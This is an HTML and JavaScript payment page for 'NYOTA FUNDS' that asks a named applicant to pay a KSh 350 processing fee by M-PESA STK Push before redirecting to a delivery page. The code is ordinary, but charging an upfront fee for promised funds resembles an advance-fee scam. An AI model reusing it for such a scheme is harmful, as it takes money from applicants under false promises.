<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#064e3b">
<title>NYOTA FUNDS — Payment</title>

<style>
*{box-sizing:border-box}

body{
    margin:0;
    min-height:100vh;
    padding:16px 10px;
    display:flex;
    align-items:center;
    justify-content:center;
    font-family:Arial,sans-serif;
    background:
        radial-gradient(circle at 10% 10%,rgba(34,197,94,.35),transparent 28%),
        radial-gradient(circle at 90% 90%,rgba(59,130,246,.35),transparent 28%),
        linear-gradient(135deg,#064e3b,#1e40af);
    color:#fff;
}

.container{
    width:100%;
    max-width:430px;
}

.card{
    width:100%;
    padding:22px 18px 18px;
    border-radius:20px;
    background:
        linear-gradient(145deg,rgba(255,255,255,.10),rgba(255,255,255,.04));
    border:1px solid rgba(255,255,255,.12);
    box-shadow:
        0 20px 60px rgba(0,0,0,.35),
        inset 0 1px 0 rgba(255,255,255,.05);
    backdrop-filter:blur(15px);
}

h1{
    text-align:center;
    font-size:24px;
    margin:2px 0 8px;
}

p{
    font-size:14px;
    line-height:1.5;
    color:rgba(255,255,255,.78);
    text-align:center;
}

.amount{
    margin:18px 0;
    padding:14px 10px;
    border-radius:12px;
    text-align:center;
    font-size:20px;
    font-weight:700;
    background:rgba(22,163,74,.10);
    border:1px solid rgba(22,163,74,.25);
}

label{
    display:block;
    margin:15px 0 7px;
    font-size:14px;
    font-weight:700;
    color:rgba(255,255,255,.9);
}

input{
    width:100%;
    padding:14px 12px;
    border-radius:10px;
    border:1px solid rgba(255,255,255,.15);
    background:rgba(255,255,255,.08);
    color:#fff;
    font-size:16px;
    outline:none;
}

input:focus{
    border-color:#16a34a;
    box-shadow:0 0 0 3px rgba(22,163,74,.15);
}

input[readonly]{
    opacity:.8;
}

button{
    width:100%;
    padding:15px;
    margin-top:17px;
    border:0;
    border-radius:11px;
    background:linear-gradient(135deg,#16a34a,#087f32);
    color:#fff;
    font-size:16px;
    font-weight:700;
    cursor:pointer;
    box-shadow:0 10px 30px rgba(22,163,74,.30);
}

button:hover{
    background:linear-gradient(135deg,#1db954,#0b7a2f);
}

button:disabled{
    background:rgba(255,255,255,.25);
    cursor:not-allowed;
    box-shadow:none;
}

#stkMessage{
    min-height:42px;
    margin-top:13px;
    color:#7ee7a8;
    font-size:13px;
    font-weight:600;
}

.success{color:#6DFFAA!important}
.error{color:#FF7D8A!important}

.small{
    font-size:12px!important;
    color:rgba(255,255,255,.55)!important;
}
</style>
</head>

<body>

<div class="container">

<div class="card">

<h1>NYOTA FUNDS</h1>

<p>Welcome, <strong id="name">Applicant</strong></p>

<p>Please complete the processing fee payment to continue.</p>

<div class="amount" id="feeAmount">
Processing Fee: KSh 350
</div>

<label for="fullName">Full Name</label>
<input type="text" id="fullName" readonly>

<label for="phone">M-PESA Phone Number</label>
<input
    type="tel"
    id="phone"
    inputmode="numeric"
    autocomplete="tel"
    placeholder="2547XXXXXXXX"
    maxlength="12">

<button id="payBtn" type="button">
Pay Processing Fee
</button>

<p id="stkMessage" role="status" aria-live="polite"></p>

<p class="small">
You will receive an M-PESA STK Push on the phone number entered above.
</p>

</div>

</div>

<script>
"use strict";

const BACKEND_URL = "https://nyota-program-backend.onrender.com";

/* Load applicant details from previous pages */

const applicant =
    localStorage.getItem("fullname") ||
    localStorage.getItem("applicantName") ||
    "Applicant";

const storedFee =
    Number(localStorage.getItem("processingFee") || "350");

const processingFee =
    Number.isFinite(storedFee) && storedFee > 0 ? storedFee : 350;

document.getElementById("name").textContent = applicant;
document.getElementById("fullName").value = applicant;
document.getElementById("feeAmount").textContent =
    "Processing Fee: KSh " + processingFee.toLocaleString("en-KE");

const phoneEl = document.getElementById("phone");
const payBtn = document.getElementById("payBtn");
const messageEl = document.getElementById("stkMessage");

function setMessage(message,type=""){
    messageEl.textContent=message;
    messageEl.className=type;
}

function normalizePhone(value){
    let phone=value.replace(/[^\d+]/g,"");
    if(phone.startsWith("+254")) phone=phone.slice(1);
    if(phone.startsWith("07")||phone.startsWith("01"))
        phone="254"+phone.slice(1);
    return phone;
}

function isValidKenyanPhone(phone){
    return /^254(?:7|1)\d{8}$/.test(phone);
}

function setLoading(loading,text="Processing..."){
    payBtn.disabled=loading;
    payBtn.textContent=loading?text:"Pay Processing Fee";
}

async function readJson(response){
    const text=await response.text();
    return text?JSON.parse(text):{};
}

async function payNow(){

    const phone=normalizePhone(phoneEl.value.trim());

    if(!isValidKenyanPhone(phone)){
        setMessage(
            "Enter a valid Kenyan M-PESA number, e.g. 254712345678.",
            "error"
        );
        phoneEl.focus();
        return;
    }

    localStorage.setItem("phoneNumber",phone);

    setLoading(true,"Sending STK Push...");
    setMessage("Sending M-PESA payment request...");

    try{

        const response=await fetch(BACKEND_URL+"/stk-push",{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({
                phone:phone,
                amount:processingFee
            })
        });

        const data=await readJson(response);

        if(!response.ok||!data.success){
            throw new Error(data.message||"STK Push failed.");
        }

        const transactionId=
            data.transactionId||
            data.checkout_request_id||
            data.data?.transactionId||
            data.data?.checkout_request_id;

        setLoading(true,"Waiting for payment...");
        setMessage(
            "STK Push sent. Enter your M-PESA PIN on your phone."
        );

        await checkPayment(transactionId);

    }catch(error){

        setMessage(error.message,"error");
        setLoading(false);

    }
}

async function checkPayment(transactionId){

    const started=Date.now();

    while(Date.now()-started<120000){

        try{

            const response=await fetch(BACKEND_URL+"/payment-status",{
                method:"POST",
                headers:{"Content-Type":"application/json"},
                body:JSON.stringify({transactionId})
            });

            const result=await readJson(response);

            if(result.success&&result.data){

                const status=String(result.data.status||"").toUpperCase();

                if(["COMPLETED","SUCCESS","CONFIRMED"].includes(status)){
                    setMessage("Payment successful. Redirecting...","success");
                    setTimeout(()=>window.location.href="delivery.html",1000);
                    return;
                }

                if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
                    throw new Error("Payment "+status.toLowerCase()+".");
                }
            }

        }catch(error){

            if(/failed|cancelled|expired/i.test(error.message)){
                setMessage(error.message,"error");
                setLoading(false);
                return;
            }

        }

        await new Promise(r=>setTimeout(r,3000));
    }

    setMessage(
        "Payment confirmation timed out. Check your M-PESA messages and try again.",
        "error"
    );

    setLoading(false);
}

payBtn.addEventListener("click",payNow);

phoneEl.addEventListener("input",()=>{
    phoneEl.value=phoneEl.value.replace(/[^\d+]/g,"");
});

phoneEl.addEventListener("keydown",e=>{
    if(e.key==="Enter") payNow();
});
</script>

</body>
</html>
